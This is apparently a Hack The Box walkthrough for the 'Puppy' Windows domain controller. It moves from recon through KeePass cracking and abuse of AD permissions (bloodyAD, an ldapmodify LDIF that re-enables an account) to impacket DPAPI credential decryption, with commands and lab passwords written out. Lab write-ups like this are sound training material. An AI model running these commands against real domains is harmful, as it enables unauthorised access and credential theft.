---
title: 'HTB-Puppy'
published: 2025-09-18
draft: false
toc: true
---
**Start 08:48 15-07-2025**

---
```
Scope:
10.10.11.70

Creds:
levi.james / KingofAkron2025!
```
# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -p- -vvvv -T5 --min-rate=5000 -Pn puppy.htb 

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-07-15 13:50:31Z)
111/tcp   open  rpcbind       syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
2049/tcp  open  nlockmgr      syn-ack 1-4 (RPC #100021)
3260/tcp  open  iscsi?        syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         syn-ack Microsoft Windows RPC
53828/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62785/tcp): CLEAN (Timeout)
|   Check 2 (port 57127/tcp): CLEAN (Timeout)
|   Check 3 (port 26380/udp): CLEAN (Timeout)
|   Check 4 (port 24379/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-07-15T13:52:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
```

## NXC

I started password spraying to see what I could find

![](attachments/8bcd03fbeda9461572a18a8ef3abbe85.png)

![](attachments/6c4569a188ebbb66fe10873a6899be26.png)

No interesting shares.

## RPCclient

![](attachments/1a862cceb1ca0ff5c4da21db6e2ca664.png)

Other than that I couldn't find more useful stuff.

## BloodHound

![](attachments/bae9da962f91a6e25c3eb4582eb2cf0f.png)

![](attachments/1f9cc7b312ff493cf9749a09c67f9efc.png)

![](attachments/5ba34d4b2ca59bd5198b0ca92e0be2bd.png)

This part is interesting:

![](attachments/b96f229d5f33059abae3ff72317a4bed.png)

![](attachments/abe6d1da4874a0f467793db4fd9d5fb4.png)

### bloodyAD - GenericWrite

```bash
bloodyAD --host 10.10.11.70 --dc-ip PUPPY.HTB -u "levi.james" -p 'KingofAkron2025!' add groupMember DEVELOPERS 'levi.james'
```

![](attachments/33c382dac573d54f4e0516956f9f6e71.png)

Once part of this group I checked out the members and found this person:

![](attachments/5db8e30a6b6fe1ea425d6ed2c5481b28.png)

As well as *Adam.silver* who's part of the **Remote Management Group**:

![](attachments/c59b1615b6d213d18c33d48294b06cad.png)

Anyways, I now of course had **READ** access to the `DEV` share:

![](attachments/ba52684a3526737092800b33ce4604ef.png)

### SMBclient

![](attachments/6f2e147baade365327748de90b1b5e8a.png)

I tried out `keepass2john` but it didn't work:

![](attachments/a2dcd77346dff8cdc1f074ab8f2cb560.png)

### keepass4brute

Luckily enough the following script exists:

![](attachments/99cec86a84108625a1a4aa563fca82ff.png)

I download it and let it run:

![](attachments/82016bdcc70a1fb55c51f277184b1566.png)

### keepassxc

I can now open the `recovery.kdbx` file as follows:

![](attachments/d2f5c21f6e9038897e400131da1bcbe5.png)

![](attachments/d9e132fa0c989c7c16e112c10ba0c674.png)

This was an absolute goldmine.

![](attachments/3eca911b92a88416ce80f89254b40ebe.png)

![](attachments/2c18829aad6cecd96d75181e730cee3e.png)

![](attachments/a6fc2977081429e6ba42541abe311424.png)

Time to abuse the `GenericAll` ACL.

### bloodyAD - GenericAll

![](attachments/7f27ead22f1f3f0d2c21f3d6c5aa3600.png)

However I was not able to log in using `evil-winrm`:

![](attachments/bf82f640390125a5f31e14ca517367d0.png)

This made sense when I password sprayed the creds:

![](attachments/25f47a70159214e3c8ece8573860e950.png)

Let's enable the account.

### ldap

```bash
ldapsearch -x -H ldap://10.10.11.70 -D "ANT.EDWARDS@PUPPY.HTB" -W -b "DC=puppy,DC=htb" "(sAMAccountName=ADAM.SILVER)"
```

![](attachments/c58c191e1fe17a2ccb4a69ba61699afb.png)

We can modify it by creating a `enable.ldif` file then using `ldap` to change it.

```bash
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
changetype: modify
replace: userAccountControl
userAccountControl: 66048
```

![](attachments/af0ed4be75763f081b153edde2a6869f.png)

```bash
ldapmodify -x -H ldap://10.10.11.70 -D "ANT.EDWARDS@PUPPY.HTB" -W -f enable.ldif
```

![](attachments/8555860687e9b951bf05e44131b4ff5c.png)

When I now check it again it looks like this:

![](attachments/9563f97ba91db8cf9895a2d94c3169fa.png)

The account should now be enabled.

# Foothold
## Shell as adam.silver

![](attachments/9d6edc014066a56b491024a4439a670a.png)

Let's start enumerating the directory:

![](attachments/54681ce90b8cce6819f191d714d60feb.png)

### user.txt

![](attachments/525a84b501c8485a7c217487da9d0315.png)

## Enumeration

![](attachments/122019379dd05e90485e64d2bc34435d.png)

![](attachments/8331edc0426fe49b6afbb764e90c95d8.png)

![](attachments/dac4c5a207e50d56980712ac91f72d25.png)

Here I found the following:

![](attachments/d423aecadb40d4e559ac33cbae7611f8.png)

Unfortunately it does *not* seem like *steph.cooper* is reusing his password for his *adm* account.

![](attachments/3b5f3a6932a6940d4f8bf55149424e73.png)

However after logging in and doing a `dir -r -h` scan I found this:

![](attachments/3f3bca97fe91e5323afd65cf78ba8488.png)

This looks like a `dpapi` creds file.

![](attachments/0260e8eb0da548bc1beb157a1dafb10f.png)

I then went ahead and transferred the files:

![](attachments/b04ef1a5a726a014a085b1d14defdbcd.png)

>[!warning]
>Simply using `download` via `evil-winrm` failed.

![](attachments/658a7e0d247976a4db57fdd55ef43735.png)

# Privilege Escalation
## impacket-dpapi

```bash
impacket-dpapi masterkey -f 556a2412-1275-4ccf-b721-e6a0b4f90407 -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
```

![](attachments/6ef9196b4ce78cc80d089ece35edd357.png)

And now for the credentials we will use the decrypted key:

```bash
impacket-dpapi credential -f C8D69EBE9A43E9DEBF6B5FBD48B521B9  -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

![](attachments/36e0feafde24746e5e0c023c7fe9c74a.png)

![](attachments/4cbb2d5c9acde88f80cc99d1951b93b3.png)

### root.txt

![](attachments/e41bf592b859648e83bca81a55d55eeb.png)

![](attachments/5239013f4c3ad7549129b575a7fa6468.png)

---

**Finished 10:15 15-07-2025**

[^Links]: [[Hack The Box]]

#impacket #dpapi #ldapsearch #ldapmodify #keepass #BloodyAD #BloodHound 
